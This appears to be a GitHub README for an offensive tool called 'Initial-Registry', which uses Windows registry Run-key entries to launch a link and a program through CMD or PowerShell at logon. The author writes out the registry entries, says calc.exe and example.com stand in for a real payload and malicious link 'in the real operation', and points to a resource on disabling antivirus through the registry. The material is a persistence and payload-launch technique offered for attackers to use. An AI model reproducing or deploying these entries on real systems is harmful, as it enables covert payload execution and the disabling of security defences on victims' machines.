# Initial-Registry
It is a registry file that performs malicious activities when the refresh button is pressed, Such as start a malicious link, making an execution for payload, or running a malicious command line in CMD or PowerShell
![1706749031823](https://github.com/S3N4T0R-0X0/Initial-Registry/assets/121706460/f5c7acd0-77a2-4410-80c4-4f8c095e7dee)

Specifically through the registry.

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"TaskManagerURL"="cmd /c start http://www.example.com && calc.exe"

The harmful activities are carried out through the CMD, but the operator may also need to execute these activities from the PowerShell and not the CMD, which is why I put this other registry as an alternative to the CMD.

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"TaskManagerURL"="powershell -Command \"Start-Process 'http://www.example.com'; Start-Process 'calc.exe' -Verb RunAs\""


Of course, in the real operation, Calc.exe will be replaced by payload, and example.com will be replaced by the malicious link. with all these malicious activities, you may be exposed to detection, and also since we use the Windows Registry in this operation, we may also use the Windows Registry or after the Windows registry to create a disable for defenses


https://github.com/S3N4T0R-0X0/Initial-Registry/assets/121706460/6e5b2591-3953-4a6b-b05f-81a405e8bf80

I used this site for resources to desible defenses through the Windows registry by setting Windows Registry  Activity in the disable.txt
https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/#disable-antivirus-and-security




